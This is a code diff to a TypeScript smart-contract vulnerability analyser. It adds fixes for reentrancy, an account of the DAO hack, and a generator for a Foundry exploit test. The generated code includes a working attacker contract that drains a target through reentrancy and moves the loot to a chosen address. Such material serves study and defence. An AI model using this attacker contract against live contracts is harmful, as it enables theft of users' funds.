@@ -13,6 +13,8 @@ import {
   VulnerabilityMetadata,
   SafetyCheck,
   AnalysisLimitations,
+  FixSuggestion,
+  EducationalContent,
 } from './types';
 
 // ============= CONFIDENCE SCORING =============
@@ -46,6 +48,193 @@ const ANALYSIS_LIMITATIONS: AnalysisLimitations = {
   ],
   disclaimer: 'This tool performs static pattern analysis only. For comprehensive security, a professional audit is required. This tool is ONE layer of defense, not a complete security solution.',
 };
+
+// ============= REENTRANCY FIX SUGGESTIONS =============
+
+function generateReentrancyFixSuggestions(functionName: string): FixSuggestion[] {
+  return [
+    {
+      name: 'Checks-Effects-Interactions (CEI) Pattern',
+      description: 'Reorder code to update state before making external calls. This is the recommended approach with zero gas overhead.',
+      vulnerableCode: `function ${functionName}() external {
+    uint256 bal = balances[msg.sender];
+    require(bal > 0, "No balance");
+
+    // VULNERABLE: External call BEFORE state update
+    (bool success, ) = msg.sender.call{value: bal}("");
+    require(success, "Transfer failed");
+
+    balances[msg.sender] = 0;  // TOO LATE!
+}`,
+      fixedCode: `function ${functionName}() external {
+    uint256 bal = balances[msg.sender];
+    require(bal > 0, "No balance");
+
+    // SAFE: State update BEFORE external call
+    balances[msg.sender] = 0;
+
+    (bool success, ) = msg.sender.call{value: bal}("");
+    require(success, "Transfer failed");
+}`,
+      gasImpact: 'None',
+      pros: ['No additional gas cost', 'Follows industry best practices', 'No external dependencies'],
+      cons: ['Requires careful code review', 'Must ensure ALL state is updated first'],
+      recommended: true,
+    },
+    {
+      name: 'ReentrancyGuard (OpenZeppelin)',
+      description: 'Use OpenZeppelin\'s battle-tested ReentrancyGuard modifier to prevent reentrancy attacks.',
+      vulnerableCode: `contract Vault {
+    function ${functionName}() external {
+        // Vulnerable to reentrancy
+    }
+}`,
+      fixedCode: `import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+contract Vault is ReentrancyGuard {
+    function ${functionName}() external nonReentrant {
+        // Protected by ReentrancyGuard
+        // Even if external call is before state update,
+        // recursive calls will revert
+    }
+}`,
+      gasImpact: '+2,300 gas per call',
+      pros: ['Battle-tested and widely audited', 'Easy to implement', 'Works regardless of code order'],
+      cons: ['Adds external dependency', 'Gas overhead on every call', 'Must inherit from contract'],
+      recommended: false,
+    },
+    {
+      name: 'Mutex Lock (Manual)',
+      description: 'Implement a simple boolean lock to prevent reentrant calls. Lightweight alternative to OpenZeppelin.',
+      vulnerableCode: `contract Vault {
+    function ${functionName}() external {
+        // Vulnerable to reentrancy
+    }
+}`,
+      fixedCode: `contract Vault {
+    bool private locked;
+
+    modifier noReentrant() {
+        require(!locked, "No reentrancy");
+        locked = true;
+        _;
+        locked = false;
+    }
+
+    function ${functionName}() external noReentrant {
+        // Protected by mutex lock
+    }
+}`,
+      gasImpact: '+200 gas per call',
+      pros: ['Simple to understand', 'No external dependencies', 'Minimal gas overhead'],
+      cons: ['Must remember to add modifier', 'Manual implementation risk', 'Not as widely audited'],
+      recommended: false,
+    },
+    {
+      name: 'Pull-over-Push Pattern',
+      description: 'Instead of pushing funds to users, let them pull (withdraw) their own funds. This is the safest pattern but requires architectural changes.',
+      vulnerableCode: `// PUSH pattern (vulnerable)
+function distribute(address[] recipients) external {
+    for (uint i = 0; i < recipients.length; i++) {
+        recipients[i].call{value: amounts[i]}("");
+    }
+}`,
+      fixedCode: `// PULL pattern (safe)
+mapping(address => uint256) public pendingWithdrawals;
+
+function claimable(address user) external view returns (uint256) {
+    return pendingWithdrawals[user];
+}
+
+function ${functionName}() external {
+    uint256 amount = pendingWithdrawals[msg.sender];
+    require(amount > 0, "Nothing to withdraw");
+
+    pendingWithdrawals[msg.sender] = 0;
+
+    // User pulls their own funds
+    payable(msg.sender).transfer(amount);
+}`,
+      gasImpact: 'None (may reduce overall gas)',
+      pros: ['Safest pattern', 'User controls when to withdraw', 'Works well with gas limits'],
+      cons: ['Requires architectural refactor', 'Users must initiate withdrawal', 'More complex UX'],
+      recommended: false,
+    },
+  ];
+}
+
+// ============= REENTRANCY EDUCATIONAL CONTENT =============
+
+function generateReentrancyEducation(functionName: string, contractName: string): EducationalContent {
+  return {
+    realWorldExample: {
+      name: 'The DAO Hack',
+      date: 'June 17, 2016',
+      impact: '$60 million stolen (3.6 million ETH)',
+      description: `The DAO was a decentralized venture capital fund on Ethereum. An attacker exploited a reentrancy vulnerability in the splitDAO() function, which allowed withdrawing funds before the balance was updated. The attacker recursively called the withdraw function, draining approximately 3.6 million ETH. This led to the controversial Ethereum hard fork, splitting the chain into ETH and ETC.`,
+    },
+    attackFlow: [
+      {
+        step: 1,
+        title: 'Setup',
+        description: `Attacker deploys a malicious contract with a receive() or fallback() function that calls ${contractName}.${functionName}() when it receives ETH.`,
+        codeSnippet: `contract Attacker {
+    ${contractName} target;
+
+    constructor(address _target) {
+        target = ${contractName}(_target);
+    }
+
+    function attack() external payable {
+        target.deposit{value: msg.value}();
+        target.${functionName}();
+    }
+
+    receive() external payable {
+        if (address(target).balance >= msg.value) {
+            target.${functionName}();  // Re-enter!
+        }
+    }
+}`,
+      },
+      {
+        step: 2,
+        title: 'Attack Execution',
+        description: `When ${functionName}() sends ETH to the attacker contract, the receive() function is triggered. Since the victim's balance hasn't been updated yet, the attacker can call ${functionName}() again, receiving more ETH each time.`,
+        codeSnippet: `// In victim contract:
+function ${functionName}() external {
+    uint256 bal = balances[msg.sender];
+
+    // 1. Check passes (attacker has balance)
+    require(bal > 0);
+
+    // 2. Send ETH - triggers attacker's receive()
+    msg.sender.call{value: bal}("");
+    //    └─> Attacker re-enters here!
+
+    // 3. This line never reached during attack
+    balances[msg.sender] = 0;
+}`,
+      },
+      {
+        step: 3,
+        title: 'Impact',
+        description: 'The attacker drains the contract by repeatedly withdrawing before their balance is set to zero. With 1 ETH deposited, an attacker can drain the entire contract balance.',
+        codeSnippet: `// Attack flow:
+// 1. Attacker deposits 1 ETH
+// 2. Attacker calls withdraw()
+// 3. Contract sends 1 ETH → triggers receive()
+// 4. receive() calls withdraw() again
+// 5. Contract sends another 1 ETH (balance still shows 1!)
+// 6. Repeat until contract is empty
+// 7. Finally, balances[attacker] = 0 executes
+
+// Result: From 1 ETH, attacker steals entire contract balance`,
+      },
+    ],
+    keyLesson: 'Always follow the Checks-Effects-Interactions pattern: perform all state changes (effects) before making external calls (interactions). The check-then-update-then-call order prevents reentrancy attacks.',
+  };
+}
 
 // ============= PARSER =============
 
@@ -418,6 +607,8 @@ function detectReentrancy(contract: ContractInfo): Vulnerability[] {
           confidenceScore: Math.min(100, Math.max(0, score)),
           confidenceFactors,
           metadata,
+          fixSuggestions: generateReentrancyFixSuggestions(func.name),
+          educational: generateReentrancyEducation(func.name, contract.name),
         });
       }
     }
@@ -701,7 +892,8 @@ function findArithmeticOperations(body: unknown): { type: string; line: number }
 // ============= EXPLOIT GENERATOR =============
 
 export function generateExploitCode(vulnerabilities: Vulnerability[], contractName: string): string | null {
-  const reentrancyVuln = vulnerabilities.find((v) => v.type === 'reentrancy' && v.location.functionName === 'withdraw');
+  const reentrancyVuln = vulnerabilities.find((v) => v.type === 'reentrancy');
+  const funcName = reentrancyVuln?.location.functionName || 'withdraw';
 
   if (!reentrancyVuln) return null;
 
@@ -711,58 +903,197 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 
 /**
- * @title Reentrancy Exploit Test
- * @notice Demonstrates reentrancy vulnerability in ${contractName}.withdraw()
- * @dev Generated by Smart Contract Attack Simulator
+ * ============================================================================
+ *                        REENTRANCY EXPLOIT TEST
+ *                        ${contractName}.${funcName}()
+ * ============================================================================
+ *
+ * HISTORICAL CONTEXT - THE DAO HACK (June 17, 2016):
+ * This is the same vulnerability that enabled The DAO hack, one of the most
+ * significant events in Ethereum history. An attacker exploited a reentrancy
+ * bug in the splitDAO() function, draining 3.6 million ETH (~$60M at the time).
+ * The incident led to the controversial Ethereum hard fork, splitting the chain
+ * into ETH (Ethereum) and ETC (Ethereum Classic).
+ *
+ * ATTACK MECHANICS:
+ * 1. Attacker deposits ETH into the vulnerable contract
+ * 2. Attacker calls ${funcName}() to initiate withdrawal
+ * 3. Contract sends ETH via .call() BEFORE updating the balance
+ * 4. Attacker's receive() function re-enters ${funcName}()
+ * 5. Steps 3-4 repeat until the contract is drained
+ * 6. Finally, balance is set to 0 (but all funds are already gone)
+ *
+ * WHY IT WORKS:
+ * The contract violates the Checks-Effects-Interactions (CEI) pattern.
+ * The external call (Interaction) happens before the state update (Effect).
+ *
+ * GAS PROFILE (approximate):
+ * - Contract deployment: ~200,000 gas
+ * - Attacker deployment: ~150,000 gas
+ * - Initial deposit: ~45,000 gas
+ * - Attack execution: ~25,000 gas per iteration
+ * - 5 iterations: ~125,000 gas
+ * - Total attack cost: ~0.01 ETH at 50 gwei
+ *
+ * PROFIT CALCULATION:
+ * - Investment: 1 ETH (deposit)
+ * - Gas cost: ~0.01 ETH
+ * - Stolen: Entire contract balance
+ * - Net profit: (Contract balance - 1 ETH - gas)
+ *
+ * Run with: forge test --match-test testReentrancyExploit -vvvv
+ * ============================================================================
  */
+
 contract ReentrancyExploitTest is Test {
     ${contractName} public target;
     AttackerContract public attacker;
 
+    // ========== CONSTANTS ==========
+    uint256 constant VICTIM_INITIAL_DEPOSIT = 10 ether;  // Funds in contract
+    uint256 constant ATTACKER_DEPOSIT = 1 ether;         // Attack investment
+    uint256 constant MAX_ATTACK_ITERATIONS = 10;         // Prevent infinite loop
+
+    // ========== SETUP ==========
     function setUp() public {
+        // Step 1: Deploy the vulnerable contract
         target = new ${contractName}();
+        console.log("Target deployed at:", address(target));
+
+        // Step 2: Deploy the attacker contract
         attacker = new AttackerContract(payable(address(target)));
+        console.log("Attacker deployed at:", address(attacker));
 
-        // Fund victim
-        vm.deal(address(0x1), 10 ether);
-        vm.prank(address(0x1));
-        target.deposit{value: 1 ether}();
+        // Step 3: Simulate victims depositing funds
+        // In real scenario, this represents legitimate user deposits
+        address victim = address(0x1);
+        vm.deal(victim, VICTIM_INITIAL_DEPOSIT);
+        vm.prank(victim);
+        target.deposit{value: VICTIM_INITIAL_DEPOSIT}();
+        console.log("Victim deposited:", VICTIM_INITIAL_DEPOSIT / 1 ether, "ETH");
 
-        // Fund attacker
-        vm.deal(address(this), 10 ether);
+        // Step 4: Fund the attacker
+        vm.deal(address(attacker), ATTACKER_DEPOSIT + 1 ether); // +1 for gas
     }
 
+    // ========== EXPLOIT TEST ==========
     function testReentrancyExploit() public {
-        uint256 balanceBefore = address(target).balance;
+        console.log("\\n========== ATTACK STARTING ==========");
 
-        attacker.attack{value: 1 ether}();
+        // Record initial state
+        uint256 targetBalanceBefore = address(target).balance;
+        uint256 attackerBalanceBefore = address(attacker).balance;
 
-        uint256 balanceAfter = address(target).balance;
+        console.log("Target balance before:", targetBalanceBefore / 1 ether, "ETH");
+        console.log("Attacker balance before:", attackerBalanceBefore / 1 ether, "ETH");
 
-        // Verify funds were drained
-        assertLt(balanceAfter, balanceBefore, "Attack should drain funds");
-        console.log("ETH drained:", balanceBefore - balanceAfter);
+        // Measure gas usage
+        uint256 gasStart = gasleft();
+
+        // Execute the attack
+        attacker.attack{value: ATTACKER_DEPOSIT}();
+
+        uint256 gasUsed = gasStart - gasleft();
+
+        // Record final state
+        uint256 targetBalanceAfter = address(target).balance;
+        uint256 attackerBalanceAfter = address(attacker).balance;
+
+        console.log("\\n========== ATTACK COMPLETE ==========");
+        console.log("Target balance after:", targetBalanceAfter / 1 ether, "ETH");
+        console.log("Attacker balance after:", attackerBalanceAfter / 1 ether, "ETH");
+        console.log("ETH stolen:", (attackerBalanceAfter - attackerBalanceBefore + ATTACKER_DEPOSIT) / 1 ether, "ETH");
+        console.log("Gas used:", gasUsed);
+        console.log("Attack iterations:", attacker.attackCount());
+
+        // Verify the attack succeeded
+        assertLt(targetBalanceAfter, targetBalanceBefore, "Attack should drain funds");
+        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker should profit");
+
+        // Calculate profit
+        uint256 profit = attackerBalanceAfter - attackerBalanceBefore + ATTACKER_DEPOSIT;
+        console.log("\\nNet profit:", profit / 1 ether, "ETH");
+        console.log("ROI:", (profit * 100) / ATTACKER_DEPOSIT, "%");
+    }
+
+    // ========== HELPER: Test with different deposit amounts ==========
+    function testReentrancyWithLargerDeposit() public {
+        // Reset and use 5 ETH deposit
+        vm.deal(address(attacker), 6 ether);
+        uint256 stolen = attacker.attackWithAmount{value: 5 ether}();
+        console.log("Stolen with 5 ETH deposit:", stolen / 1 ether, "ETH");
     }
 }
 
+/**
+ * ============================================================================
+ *                           ATTACKER CONTRACT
+ * ============================================================================
+ * This malicious contract exploits the reentrancy vulnerability by:
+ * 1. Depositing ETH to become a legitimate user
+ * 2. Calling withdraw to trigger the vulnerability
+ * 3. Re-entering via receive() before balance is updated
+ */
 contract AttackerContract {
     ${contractName} public target;
     uint256 public attackCount;
+    uint256 public constant MAX_ATTACKS = ${10};
 
     constructor(address payable _target) {
         target = ${contractName}(_target);
     }
 
+    /**
+     * @notice Execute the reentrancy attack
+     * @dev Deposits ETH then triggers withdraw, which calls receive()
+     */
     function attack() external payable {
+        require(msg.value >= 0.1 ether, "Need ETH to attack");
+
+        // Step 1: Deposit to become a user
         target.deposit{value: msg.value}();
-        target.withdraw();
+
+        // Step 2: Trigger the vulnerable withdraw
+        // This will send ETH to us, triggering receive()
+        target.${funcName}();
     }
 
+    /**
+     * @notice Attack with specified amount and return stolen ETH
+     */
+    function attackWithAmount() external payable returns (uint256) {
+        uint256 before = address(this).balance;
+        target.deposit{value: msg.value}();
+        target.${funcName}();
+        return address(this).balance - before + msg.value;
+    }
+
+    /**
+     * @notice This is where the magic happens - reentrancy!
+     * @dev Called when we receive ETH from the vulnerable contract
+     *
+     * ATTACK FLOW:
+     * 1. target.${funcName}() sends us ETH
+     * 2. This receive() is triggered
+     * 3. We immediately call ${funcName}() AGAIN
+     * 4. target still thinks we have a balance (not updated yet!)
+     * 5. target sends us MORE ETH
+     * 6. Repeat until contract is drained or gas runs out
+     */
     receive() external payable {
-        if (attackCount < 5 && address(target).balance >= msg.value) {
+        // Safety: Limit iterations to prevent out-of-gas
+        if (attackCount < MAX_ATTACKS && address(target).balance >= msg.value) {
             attackCount++;
-            target.withdraw();
+            // RE-ENTER THE VULNERABLE FUNCTION!
+            target.${funcName}();
         }
+    }
+
+    /**
+     * @notice Withdraw stolen funds to EOA
+     */
+    function withdrawLoot(address payable to) external {
+        to.transfer(address(this).balance);
     }
 }`;
 }
